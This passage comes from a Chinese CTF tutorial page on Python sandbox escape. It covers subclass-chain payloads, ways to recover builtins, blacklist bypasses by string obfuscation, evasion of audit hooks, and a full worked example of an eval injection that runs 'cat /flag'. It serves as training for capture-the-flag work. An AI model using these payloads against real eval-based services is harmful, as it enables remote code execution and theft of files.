+<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>        <span class="k">if</span> <span class="bp">cls</span><span class="o">.</span><span class="vm">__name__</span> <span class="o">==</span> <span class="s2">"_wrap_close"</span><span class="p">:</span>
+<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>            <span class="k">return</span> <span class="n">i</span>
+</code></pre></div>
+<p>找到下标后（假设是 117，不同 Python 版本下标不同，<strong>实际做题时必须先动态定位</strong>）：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="n">payload</span> <span class="o">=</span> <span class="p">(</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>    <span class="s2">"().__class__.__base__.__subclasses__()[117]"</span>
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>    <span class="s2">".__init__.__globals__['system']('cat /flag')"</span>
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="p">)</span>
+</code></pre></div>
+<p>其中用到的新属性：</p>
+<ul>
+<li><code>__init__</code>：类的构造方法，是一个函数对象；</li>
+<li><code>__globals__</code>：函数所在模块的全局变量字典，<code>os._wrap_close.__init__.__globals__</code> 就包含 <code>system</code>、<code>popen</code> 等。</li>
+</ul>
+<p>更稳的写法是不猜下标，直接在 payload 里搜索（只要沙箱允许写表达式）：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="n">payload</span> <span class="o">=</span> <span class="p">(</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>    <span class="s2">"[c for c in ().__class__.__base__.__subclasses__() "</span>
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>    <span class="s2">"if c.__name__ == '_wrap_close'][0]"</span>
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>    <span class="s2">".__init__.__globals__['system']('cat /flag')"</span>
+<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="p">)</span>
+</code></pre></div>
+<h3 id="_frozen_importlib-builtinimporter">借助 <code>_frozen_importlib</code> 的 <code>BuiltinImporter</code><a class="headerlink" href="#_frozen_importlib-builtinimporter" title="Permanent link">¶</a></h3>
+<p>Python 3 的解释器内部会加载 <code>_frozen_importlib</code>，其中存在 <code>BuiltinImporter</code> 类，它有 <code>load_module</code> 方法可以加载内置模块（<code>os</code> 就是内置模块之一，无需 <code>import</code> 语句）：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="n">payload</span> <span class="o">=</span> <span class="p">(</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>    <span class="s2">"[c for c in ().__class__.__base__.__subclasses__() "</span>
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>    <span class="s2">"if c.__name__ == 'BuiltinImporter'][0]"</span>
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>    <span class="s2">".load_module('os').system('cat /flag')"</span>
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="p">)</span>
+</code></pre></div>
+<p>注意 <code>_frozen_importlib</code> 在不同 Python 版本里类名和组织方式有变化（有的版本在 <code>BuiltinImporter</code> 外层还有一层），实战中以现场枚举为准。</p>
+<h3 id="warningscatch_warnings-builtins">用 <code>warnings.catch_warnings</code> 拿 builtins<a class="headerlink" href="#warningscatch_warnings-builtins" title="Permanent link">¶</a></h3>
+<p><code>warnings.catch_warnings</code> 类的 <code>__init__.__globals__</code> 里有 <code>__builtins__</code>，可直接恢复内建函数：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="n">payload</span> <span class="o">=</span> <span class="p">(</span>
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>    <span class="s2">"[c for c in ().__class__.__base__.__subclasses__() "</span>
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>    <span class="s2">"if c.__name__ == 'catch_warnings'][0]"</span>
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>    <span class="s2">"()._module.__builtins__['__import__']('os').system('cat /flag')"</span>
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="p">)</span>
+</code></pre></div>
+<p>思路共通的还有：找任意函数对象的 <code>__globals__</code>（<code>__builtins__</code> 默认就在里面）、找已加载模块的 <code>sys.modules</code> 等。核心套路一句话：<strong>枚举子类 → 找含目标模块引用的类 → 经 <code>__globals__</code>/<code>load_module</code> 拿到模块 → 调用 <code>system</code>/<code>popen</code></strong>。</p>
+<h2 id="__builtins__-import"><code>__builtins__</code> 恢复与 import 绕过<a class="headerlink" href="#__builtins__-import" title="Permanent link">¶</a></h2>
+<p>很多沙箱的第一道防线是执行时传入 <code>{"__builtins__": {}}</code>，把内建函数全部掏空。这时 <code>import</code>、<code>open</code>、<code>eval</code> 都不存在了，但它们并没有消失——只是当前命名空间看不见而已。</p>
+<p>恢复 <code>__builtins__</code> 的常见途径：</p>
+<ol>
+<li><strong>从任意函数爬</strong>：任何一个在"正常"模块里定义的函数，其 <code>__globals__['__builtins__']</code> 都是完整的内建集合。上面的 <code>catch_warnings</code> 链就是例子。</li>
+<li><strong>从加载过的模块爬</strong>：如果解释器已经 <code>import os</code> 过，<code>sys.modules['os']</code> 就直接可用：</li>
+</ol>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="p">[]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span>  <span class="c1"># 先找能拿到 sys 的类</span>
+</code></pre></div>
+<p>拿到 <code>sys</code> 后 <code>sys.modules['os'].system('id')</code> 即可。</p>
+<p>绕过「禁止 import 语句」的手段：</p>
+<ul>
+<li><code>__builtins__['__import__']('os')</code> —— 用内建的 <code>__import__</code> 函数，不经过 <code>import</code> 关键字；</li>
+<li><code>BuiltinImporter.load_module('os')</code> —— 上一节的链；</li>
+<li>字符串变形绕过对 <code>import</code> 这个词的过滤：<code>__builtins__['__im'+'port__']('o'+'s')</code>。</li>
+</ul>
+<h2 id="_3">常见过滤绕过<a class="headerlink" href="#_3" title="Permanent link">¶</a></h2>
+<p>出题人通常会在 payload 上加一层字符串黑名单。以下是按出题频率排序的绕过手法，核心是：<strong>黑名单匹配的是「字符串」，而 Python 有无数种方式在运行期拼出同一个字符串。</strong></p>
+<h3 id="_4">字符拼接与反转<a class="headerlink" href="#_4" title="Permanent link">¶</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="s2">"__cla"</span><span class="o">+</span><span class="s2">"ss__"</span>          <span class="c1"># 拼接</span>
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="s2">"__ssalc__"</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>       <span class="c1"># 反转</span>
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="s2">"o"</span><span class="o">+</span><span class="s2">"s"</span>                 <span class="c1"># 模块名同样可拆</span>
+</code></pre></div>
+<h3 id="getattr"><code>getattr</code> 替代点号访问<a class="headerlink" href="#getattr" title="Permanent link">¶</a></h3>
+<p>黑名单常过滤 <code>__class__</code> 这样的属性名，改用 <code>getattr</code> 后属性名变成普通字符串，再叠加拼接即可：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="nb">getattr</span><span class="p">((),</span> <span class="s2">"__cla"</span><span class="o">+</span><span class="s2">"ss__"</span><span class="p">)</span>
+</code></pre></div>
+<p>链式调用：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="nb">getattr</span><span class="p">(</span><span class="nb">getattr</span><span class="p">((),</span> <span class="s2">"__cla"</span><span class="o">+</span><span class="s2">"ss__"</span><span class="p">),</span> <span class="s2">"__ba"</span><span class="o">+</span><span class="s2">"se__"</span><span class="p">)</span>
+</code></pre></div>
+<h3 id="_5">编码绕过<a class="headerlink" href="#_5" title="Permanent link">¶</a></h3>
+<ul>
+<li><strong>十六进制 / 八进制转义</strong>：<code>"\137\137class\137\137"</code> 即 <code>"__class__"</code>（<code>\137</code> 是八进制的 <code>_</code>）。</li>
+<li><strong>bytes 按 ASCII 码构造</strong>：不让出现某些字符，就直接用码点拼出整个字符串：</li>
+</ul>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="nb">getattr</span><span class="p">((),</span> <span class="nb">bytes</span><span class="p">([</span><span class="mi">95</span><span class="p">,</span><span class="mi">95</span><span class="p">,</span><span class="mi">99</span><span class="p">,</span><span class="mi">108</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">115</span><span class="p">,</span><span class="mi">115</span><span class="p">,</span><span class="mi">95</span><span class="p">,</span><span class="mi">95</span><span class="p">])</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>  <span class="c1"># "__class__"</span>
+</code></pre></div>
+<p>若还能拿到 <code>codecs</code> 或 <code>base64</code> 模块，也可以 <code>codecs.decode("X19jbGFzc19f", "base64")</code> 这样整体解码，黑名单完全无感。</p>
+<h3 id="f-string">格式化字符串与 f-string<a class="headerlink" href="#f-string" title="Permanent link">¶</a></h3>
+<p>当题目禁止引号或某些字母时，可以用格式化从已有字符串里"取字"：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="s2">"</span><span class="si">{c.__class__}</span><span class="s2">"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">c</span><span class="o">=</span><span class="p">())</span>      <span class="c1"># str.format 触发属性访问</span>
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="p">()</span><span class="o">.</span><span class="vm">__class__</span><span class="si">}</span><span class="s2">"</span>                 <span class="c1"># f-string 里可以直接写表达式</span>
+</code></pre></div>
+<p>更进阶的是 <code>str.format</code> 直接访问下标和属性：<code>"{0.__class__.__base__}".format(())</code>，在 SSTI 场景（见「SSTI注入」一章，Jinja2 沙箱逃逸用的是同一套思路）中极其常用。</p>
+<h3 id="_6">其他小技巧<a class="headerlink" href="#_6" title="Permanent link">¶</a></h3>
+<ul>
+<li>过滤了 <code>()</code>？用 <code>[]</code>（列表）或 <code>{}</code>、<code>""</code> 起步，它们都能到 <code>object</code>。</li>
+<li>过滤了 <code>.</code>？<code>getattr</code> 或者 <code>vars()</code>、<code>dir()</code> 组合。</li>
+<li>过滤了数字下标？用 <code>pop()</code>、<code>index()</code> 或生成器表达式逐个判断 <code>__name__</code>。</li>
+<li>过滤了引号？从文档字符串、错误信息里取字符，如 <code>().__doc__[1]</code>。</li>
+</ul>
+<h2 id="audit-hookpython-38">audit hook（Python 3.8+）新考点简介<a class="headerlink" href="#audit-hookpython-38" title="Permanent link">¶</a></h2>
+<p>Python 3.8 引入了 <strong>审计钩子（audit hook）</strong> 机制：解释器在执行敏感操作（<code>os.system</code>、<code>open</code>、<code>import</code>、<code>compile</code> 等）之前会触发一个审计事件，注册了钩子的代码可以检查参数并 <strong>抛出异常拒绝执行</strong>：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>
+<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="k">def</span><span class="w"> </span><span class="nf">hook</span><span class="p">(</span><span class="n">event</span><span class="p">,</span> <span class="n">args</span><span class="p">):</span>
+<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>    <span class="k">if</span> <span class="n">event</span> <span class="ow">in</span> <span class="p">(</span><span class="s2">"os.system"</span><span class="p">,</span> <span class="s2">"subprocess.Popen"</span><span class="p">,</span> <span class="s2">"open"</span><span class="p">):</span>
+<a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>        <span class="k">raise</span> <span class="ne">RuntimeError</span><span class="p">(</span><span class="sa">f</span><span class="s2">"blocked: </span><span class="si">{</span><span class="n">event</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+<a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>
+<a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a><span class="n">sys</span><span class="o">.</span><span class="n">addaudithook</span><span class="p">(</span><span class="n">hook</span><span class="p">)</span>
+</code></pre></div>
+<p>近三年越来越多的 CTF 沙箱题用它代替（或叠加）关键字黑名单，因为：</p>
+<ul>
+<li>钩子注册后 <strong>无法移除</strong>（<code>addaudithook</code> 是单向的），逃逸者必须在「不触发被禁事件」的前提下完成目标，或者找到尚未被 hook 的等价路径；</li>
+<li>它工作在 C 层事件上，<code>getattr</code>、字符拼接这些字符串层绕过对它无效——<code>os.system</code> 无论怎么拼出来，调用瞬间都会触发 <code>os.system</code> 事件。</li>
+</ul>
+<p>面对 audit hook，常见思路是换事件类别：例如 <code>os.system</code> 被禁但 <code>os.exec*</code>、<code>os.spawn*</code>、<code>ctypes</code> 或文件描述符读写 <code>/proc/self/...</code> 没被禁；或者干脆不执行命令，改为用未被 hook 的 <code>open</code> 等价物（如 <code>io.open</code>、<code>codecs.open</code>、<code>pathlib.Path.read_text</code>）直接读 flag。做题时先用一段探针代码触发各事件，观察报错信息里钩子放行了什么。</p>
+<h2 id="ctf">CTF 例题完整流程<a class="headerlink" href="#ctf" title="Permanent link">¶</a></h2>
+<p><strong>题目描述（虚构但高度典型）：</strong> 某在线计算器，POST 参数 <code>expr</code> 会被 <code>eval()</code> 执行，黑名单过滤了 <code>import</code>、<code>os</code>、<code>open</code>、<code>system</code>、<code>flag</code> 和 <code>__</code>，且 <code>__builtins__</code> 被清空。</p>
+<p><strong>第一步：摸清环境。</strong> 先确认能执行表达式：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="nf">POST</span> <span class="nn">/calc</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>
+<a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="nt">expr</span><span class="o">=</span><span class="s">1%2B1</span>
+</code></pre></div>
+<p>返回 <code>2</code>，确认是 <code>eval</code> 且回显结果。</p>
+<p><strong>第二步：确认继承链可用。</strong> 黑名单里有 <code>__</code>，所有双下划线属性都要变形。用 <code>getattr</code> + 拼接测试：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="n">expr</span><span class="o">=</span><span class="nb">getattr</span><span class="p">(</span><span class="s1">''</span><span class="p">,</span> <span class="s1">'__cla'</span><span class="o">+</span><span class="s1">'ss__'</span><span class="p">)</span>
+</code></pre></div>
+<p>返回 <code>&lt;class 'str'&gt;</code>，链可用。</p>
+<p><strong>第三步：枚举子类，找 <code>_wrap_close</code>。</strong> 由于回显只显示表达式结果，直接让 payload 返回目标类的下标：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="n">expr</span><span class="o">=</span><span class="p">[</span><span class="n">i</span> <span class="k">for</span> <span class="n">i</span><span class="p">,</span><span class="n">c</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="nb">getattr</span><span class="p">(</span><span class="nb">getattr</span><span class="p">(</span><span class="nb">getattr</span><span class="p">(</span><span class="s1">''</span><span class="p">,</span><span class="s1">'__cla'</span><span class="o">+</span><span class="s1">'ss__'</span><span class="p">),</span><span class="s1">'__ba'</span><span class="o">+</span><span class="s1">'se__'</span><span class="p">),</span><span class="s1">'__subcl'</span><span class="o">+</span><span class="s1">'asses__'</span><span class="p">)())</span> <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="vm">__name__</span><span class="o">==</span><span class="s1">'_wrap_close'</span><span class="p">]</span>
+</code></pre></div>
+<p>这里 <code>__name__</code> 也含 <code>__</code>，要改成 <code>getattr(c,'__na'+'me__')</code>。假设返回 <code>[117]</code>。</p>
+<p><strong>第四步：构造读 flag 链。</strong> <code>system</code> 和 <code>flag</code> 都在黑名单里，全部变形；同时 <code>os</code> 也被过滤，但 <code>'system'</code> 是字典键字符串，可拼接：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="n">expr</span><span class="o">=</span><span class="nb">getattr</span><span class="p">([</span><span class="n">c</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">getattr</span><span class="p">(</span><span class="nb">getattr</span><span class="p">(</span><span class="nb">getattr</span><span class="p">(</span><span class="s1">''</span><span class="p">,</span><span class="s1">'__cla'</span><span class="o">+</span><span class="s1">'ss__'</span><span class="p">),</span><span class="s1">'__ba'</span><span class="o">+</span><span class="s1">'se__'</span><span class="p">),</span><span class="s1">'__subcl'</span><span class="o">+</span><span class="s1">'asses__'</span><span class="p">)()</span> <span class="k">if</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="s1">'__na'</span><span class="o">+</span><span class="s1">'me__'</span><span class="p">)</span><span class="o">==</span><span class="s1">'_wrap_close'</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="p">,</span><span class="s1">'__glob'</span><span class="o">+</span><span class="s1">'als__'</span><span class="p">)[</span><span class="s1">'sys'</span><span class="o">+</span><span class="s1">'tem'</span><span class="p">](</span><span class="s1">'cat /fl'</span><span class="o">+</span><span class="s1">'ag'</span><span class="p">)</span>
+</code></pre></div>
+<p>等一下——<code>__init__</code> 也带 <code>__</code>，同样要 <code>getattr(c, '__in'+'it__')</code>。整理后的最终 payload（URL 编码前）：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="n">expr</span><span class="o">=</span><span class="nb">getattr</span><span class="p">(</span><span class="nb">getattr</span><span class="p">([</span><span class="n">c</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">getattr</span><span class="p">(</span><span class="nb">getattr</span><span class="p">(</span><span class="nb">getattr</span><span class="p">(</span><span class="s1">''</span><span class="p">,</span><span class="s1">'__cla'</span><span class="o">+</span><span class="s1">'ss__'</span><span class="p">),</span><span class="s1">'__ba'</span><span class="o">+</span><span class="s1">'se__'</span><span class="p">),</span><span class="s1">'__subcl'</span><span class="o">+</span><span class="s1">'asses__'</span><span class="p">)()</span> <span class="k">if</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="s1">'__na'</span><span class="o">+</span><span class="s1">'me__'</span><span class="p">)</span><span class="o">==</span><span class="s1">'_wrap_close'</span><span class="p">][</span><span class="mi">0</span><span class="p">],</span><span class="s1">'__in'</span><span class="o">+</span><span class="s1">'it__'</span><span class="p">),</span><span class="s1">'__glob'</span><span class="o">+</span><span class="s1">'als__'</span><span class="p">)[</span><span class="s1">'sys'</span><span class="o">+</span><span class="s1">'tem'</span><span class="p">](</span><span class="s1">'cat /fl'</span><span class="o">+</span><span class="s1">'ag'</span><span class="p">)</span>
+</code></pre></div>
+<p><strong>第五步：发送并读 flag。</strong> URL 编码后 POST，页面返回 <code>flag{pyth0n_0bject_cha1n_1s_p0werful}</code>。</p>
+<p><strong>复盘要点：</strong></p>
+<ol>
+<li>黑名单过滤的是字符串，不是行为——一切被禁的词都能用拼接、<code>getattr</code>、编码重新造出来；</li>
+<li>下标不要硬编码，用列表推导按 <code>__name__</code> 动态搜索，跨 Python 版本也能用；</li>
+<li>如果题目禁了 <code>eval</code> 回显（盲打），把 <code>system</code> 换成 <code>curl</code> 外带，或把结果写进某个可访问的文件再读（结合「SSRF注入」「RCE」两章的外带思路）；</li>
+<li>如果题目用了 audit hook，先探明被禁事件列表，再换未被 hook 的等价函数。</li>
+</ol>
+<h2 id="_7">小结<a class="headerlink" href="#_7" title="Permanent link">¶</a></h2>
+<p>Python 沙箱逃逸的本质是一场「自省能力 vs 限制手段」的对抗：解释器给的元信息越多，逃逸链就越多；出题人封得越靠底层（如 audit hook），绕过就越需要换思路而非换拼写。掌握 <code>__class__ → __base__ → __subclasses__ → __globals__</code> 这条主干，再加上字符串变形三板斧（拼接、<code>getattr</code>、编码），足以应付绝大多数 CTF 沙箱题。相关思路与「SSTI注入」章节的模板沙箱逃逸一脉相承，建议对照阅读。</p></div>
+
+<!-- Source file information -->
+
+
+<!-- Was this page helpful? -->
+
+  
+
+
+
+
+<!-- Previous and next pages link -->
+<nav
+class="md-footer__inner md-grid"
+aria-label="页脚"
+
+>
+
+<!-- Link to previous page -->
+
+  
+  <a
+    href="../py_unser/"
+    class="md-footer__link md-footer__link--prev"
+    aria-label="上一页: Python反序列化"
+    rel="prev"
+  >
+    <div class="md-footer__button md-icon">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+    </div>
+    <div class="md-footer__title">
+      <span class="md-footer__direction">
+        上一页
+      </span>
+      <div class="md-ellipsis">
+        Python反序列化
+      </div>
+    </div>
+  </a>
+
+
+<!-- Link to next page -->
+
+  
+  <a
+    href="../flask_sec/"
+    class="md-footer__link md-footer__link--next"
+    aria-label="下一页: Flask安全"
+    rel="next"
+  >
+    <div class="md-footer__title">
+      <span class="md-footer__direction">
+        下一页
+      </span>
+      <div class="md-ellipsis">
+        Flask安全
+      </div>
+    </div>
+    <div class="md-footer__button md-icon">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+    </div>
+  </a>
+
+</nav>
+
+<!-- Comment system -->
+
+  <h2 id="__comments">评论</h2>
+
+  <!-- giscus：主题与外壳 hc-theme 同步（初始 + 切换时 postMessage） -->
+  <script src="https://giscus.app/client.js"
+    data-repo="ProbiusOfficial/Hello-CTF"
+    data-repo-id="R_kgDOJXX6hg"
+    data-category="Show and tell"
+    data-category-id="DIC_kwDOJXX6hs4CXmuV"
+    data-mapping="pathname"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="top"
+    data-theme="light"
+    data-lang="zh-CN"
+    crossorigin="anonymous"
+    async>
+  </script>
+  <script>
+    (function () {
+      var script = document.querySelector("script[src*=giscus]");
+      function currentTheme() {
+        var t = null;
+        try { t = localStorage.getItem("hc-theme"); } catch (e) {}
+        return t === "dark" ? "dark" : "light";
+      }
+      /* 初始主题：giscus 加载前写入 data-theme */
+      script.setAttribute("data-theme", currentTheme());
+      /* 外壳主题切换 → 通知 giscus iframe 换肤（由 shell.js 广播 hc-theme-change） */
+      document.addEventListener("hc-theme-change", function (e) {
+        var theme = e.detail === "dark" ? "dark" : "light";
+        var iframe = document.querySelector("iframe.giscus-frame");
+        if (iframe) {
+          iframe.contentWindow.postMessage(
+            { giscus: { setConfig: { theme: theme } } },
+            "https://giscus.app"
+          );
+        }
+      });
+    })();
+  </script>
+
+  <!-- 评论区显示优化 -->
+  <style>
+    #__comments {
+      margin-top: 2.2rem;
+      padding-top: 1.2rem;
+      border-top: 1px solid var(--line, #e6eaf1);
+      font-size: 1rem;
+    }
+    .giscus, .giscus-frame { width: 100%; }
+    .giscus-frame { border: none; color-scheme: light; }
+    [data-md-color-scheme="slate"] .giscus-frame { color-scheme: dark; }
+  </style>
+
+
+<!-- 才懒得给你加空格呢 给你塞个 Pangu.js 哼！ -->
+<head>
+  <script src="https://cdn.jsdelivr.net/npm/pangu.simple@1.0.5/dist/browser/pangu.js"></script>
+  <script>
+    pangu.spacingPage();
+  </script>
+</head>
+      </article>
+      
+        <aside class="hc-toc">
+          <div class="hc-toc-cap">ON THIS PAGE</div>
+          
+  <ul>
+    
+      <li>
+        <a href="#python">Python沙箱逃逸</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#python_1">什么是 Python 沙箱题</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_1">对象继承链基础</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_2">经典逃逸链讲解</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#os_wrap_close">借助 os._wrap_close</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_frozen_importlib-builtinimporter">借助 _frozen_importlib 的 BuiltinImporter</a>
+        
+      </li>
+    
+      <li>
+        <a href="#warningscatch_warnings-builtins">用 warnings.catch_warnings 拿 builtins</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+      <li>
+        <a href="#__builtins__-import">__builtins__ 恢复与 import 绕过</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_3">常见过滤绕过</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#_4">字符拼接与反转</a>
+        
+      </li>
+    
+      <li>
+        <a href="#getattr">getattr 替代点号访问</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_5">编码绕过</a>
+        
+      </li>
+    
+      <li>
+        <a href="#f-string">格式化字符串与 f-string</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_6">其他小技巧</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+      <li>
+        <a href="#audit-hookpython-38">audit hook（Python 3.8+）新考点简介</a>
+        
+      </li>
+    
+      <li>
+        <a href="#ctf">CTF 例题完整流程</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_7">小结</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+  </ul>
+
+        </aside>
+      
+    </div>
+    <footer class="hc-footer">
+      <span>© 2026 探姬 · Hello CTF</span>
+      <span class="links">
+        <a href="https://github.com/ProbiusOfficial/Hello-CTF" target="_blank" rel="noopener">GitHub</a>
+        <a href="https://github.com/ProbiusOfficial/Hello-CTF/pulls" target="_blank" rel="noopener">参与共建</a>
+        <a href="../../sidebar/feedback.html">反馈与群聊</a>
+      </span>
+    </footer>
+  </div>
+
+  <!-- 站点原有 extra_javascript（baidu_SEO / katex / statis / FullCalendar 等） -->
+  
+    <script src="../../javascripts/baidu_SEO.js"></script>
+  
+    <script src="../../javascripts/katex.js"></script>
+  
+    <script src="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.js"></script>
+  
+    <script src="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/contrib/auto-render.min.js"></script>
+  
+    <script src="../../javascripts/statis.js"></script>
+  
+    <script src="../../javascripts/FullCalendar.js"></script>
+  
+    <script src="../../shell/feedback-widget.js"></script>
+  
+
+  <!-- mermaid（material bundle 移除后自行加载） -->
+  <script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js"></script>
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      if (!window.mermaid) return;
+      document.querySelectorAll("pre.mermaid").forEach(function (el) {
+        var div = document.createElement("div");
+        div.className = "mermaid";
+        div.textContent = el.textContent;
+        el.replaceWith(div);
+      });
+      try {
+        mermaid.initialize({ startOnLoad: false, theme: "neutral" });
+        mermaid.run({ querySelector: ".mermaid" });
+      } catch (e) {}
+    });
+  </script>
+
+  <!-- 代码复制按钮（material bundle 移除后自实现） -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      document.querySelectorAll(".md-typeset pre").forEach(function (pre) {
+        if (pre.querySelector(".hc-copy") || pre.classList.contains("mermaid")) return;
+        var btn = document.createElement("button");
+        btn.className = "hc-copy";
+        btn.textContent = "复制";
+        btn.onclick = function () {
+          var text = pre.innerText.replace(/^复制\n/, "");
+          navigator.clipboard.writeText(text).then(function () {
+            btn.textContent = "已复制";
+            setTimeout(function () { btn.textContent = "复制"; }, 1500);
+          });
+        };
+        pre.appendChild(btn);
+      });
+    });
+  </script>
+
+  <!-- TOC 滚动高亮 -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      var links = Array.from(document.querySelectorAll(".hc-toc a"));
+      if (!links.length) return;
+      var map = links.map(function (a) {
+        var el = document.getElementById(decodeURIComponent(a.getAttribute("href").slice(1)));
+        return el ? { a: a, el: el } : null;
+      }).filter(Boolean);
+      function spy() {
+        var current = null;
+        map.forEach(function (m) { if (m.el.getBoundingClientRect().top <= 80) current = m; });
+        links.forEach(function (a) { a.classList.remove("on"); });
+        if (current) current.a.classList.add("on");
+      }
